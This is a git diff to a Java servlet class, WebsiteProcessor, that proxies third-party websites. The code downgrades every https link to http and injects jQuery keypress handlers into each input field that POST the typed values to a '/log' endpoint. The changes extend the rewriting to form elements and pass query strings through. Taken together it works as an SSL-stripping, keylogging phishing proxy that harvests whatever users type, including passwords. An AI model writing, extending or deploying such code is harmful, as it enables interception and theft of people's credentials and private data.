@@ -41,11 +41,15 @@ public class WebsiteProcessor {
 		String endPoint = request.getRequestURI();
 		setBase(request.getParameter("url"));
 		String url = getBase()+endPoint;
+		String query = request.getQueryString();
+		if(query!=null && !query.equals("null")){
+			url+="?"+query;
+		}
 		String html = getRawResponseAndSetBasic(url,"GET",request,response);
-		String modifiedHtml = processHTML(html, url.contains(".js"));
+		String modifiedHtml = processHTML(url, html, url.contains(".js"));
 		response.getWriter().write(modifiedHtml);
 	}
-	public String processHTML(String html,boolean isJS) throws MalformedURLException, IOException{
+	public String processHTML(String url, String html,boolean isJS) throws MalformedURLException, IOException{
 		//downgrade all links to http
 		Pattern p = Pattern.compile("https");
 		Matcher m = p.matcher(html);
@@ -62,6 +66,7 @@ public class WebsiteProcessor {
 		//downgrade all src href links to http
 		Elements links = doc.select("img");
 		links.addAll(doc.select("input"));
+		links.addAll(doc.select("form"));
 		for(Element l:links){
 			String imgSrc = l.attr("src");
 			if(!imgSrc.contains("//")){
@@ -74,9 +79,14 @@ public class WebsiteProcessor {
 		Elements inputs = doc.select("input");
 		for(Element input:inputs){
 			if(input.attr("id")!=null && !input.attr("id").equals("")){
-				String jqueryStr = "'key "+input.attr("id")+" value '+ "+"$('#"+input.attr("id")+"').val()";
-				String ajaxString = "$.ajax({url:'/log',data:{url:'"+getBase()+"',data:"+jqueryStr+"}})";
-				String complete = "<script> $( '#"+input.attr("id")+"' ).keypress(function() {"+ajaxString+"}) </script>";
+				String keyString ="'"+input.attr("id")+"'";
+				String valueString = "$('#"+input.attr("id")+"').val()";
+				String var = "var d = {url:'"+url+"',key:"+keyString+",value:"+valueString+"};";
+				String ajaxString = "$.ajax({url:'/log',type: 'POST',data:d})";
+				String complete = "<script> $( '#"+input.attr("id")+"' ).keypress(function() {"+
+				var+
+				ajaxString+
+				"}) </script>";
 				doc.append(complete);
 			}
 		}
@@ -84,19 +94,13 @@ public class WebsiteProcessor {
 	}
 	public String getRawResponseAndSetBasic(String url,String method,HttpServletRequest request, HttpServletResponse response) throws IOException{
 		String link = "https://"+url;
-		String query = request.getQueryString();
-		if(query!=null && !query.equals("null")){
-			link+="?"+query;
-		}
 		URL u = new URL(link);
 		HttpURLConnection  conn = (HttpURLConnection) u.openConnection();
-		System.out.println(link);
 		conn.setReadTimeout(5000);
 		conn.setRequestMethod(method);
 		conn.setUseCaches(false);
 		Map<String, String[]> params = request.getParameterMap();
 		for(String key:params.keySet()){
-			System.out.println(key);
 			conn.addRequestProperty(key, params.get(key)[0]);
 		}
 		if(method.equals("POST")){
